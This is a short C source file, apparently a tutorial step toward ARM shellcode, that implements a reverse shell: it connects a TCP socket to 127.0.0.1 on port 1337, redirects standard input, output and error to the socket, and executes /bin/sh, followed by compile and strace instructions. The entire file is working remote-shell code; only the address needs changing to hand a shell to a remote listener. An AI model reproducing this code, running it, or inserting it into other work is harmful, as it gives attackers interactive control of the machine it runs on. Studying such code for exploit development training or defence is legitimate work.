/* Some libraries that we need for completing this, you can use 
the man command to check their functionality. */

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
 
/* Syscalls numbers that we need, this can be found by typing
this command : cat /usr/include/arm-linux-gnueabihf/asm/unistd.h
| grep socket */

#define __NR_socket    (__NR_SYSCALL_BASE+281)
#define __NR_connect   (__NR_SYSCALL_BASE+283)
#define __NR_dup2      (__NR_SYSCALL_BASE+ 63)
#define __NR_execve    (__NR_SYSCALL_BASE+ 11)


int main(void)
{
 int sockfd; 
 socklen_t socklen; // Lenght for new connections
 
 struct sockaddr_in addr; 
 
 addr.sin_family = AF_INET; 
 addr.sin_port = htons( 1337 ); // Port defined for listening
 addr.sin_addr.s_addr = inet_addr("127.0.0.1"); // Ip defined for listening
 
 // New TCP socket
 sockfd = socket( AF_INET, SOCK_STREAM, IPPROTO_IP );
 
 // Connect the sockets
 connect(sockfd, (struct sockaddr *)&addr, sizeof(addr));
 
 dup2(sockfd, 0);
 dup2(sockfd, 1);
 dup2(sockfd, 2);
 
 // Sh
 execve( "/bin/sh", NULL, NULL );
}

/* Compile and run:

- $ gcc main.c -o reverse
- $ strace -e execve,socket,connect,dup2 ./reverse

*/


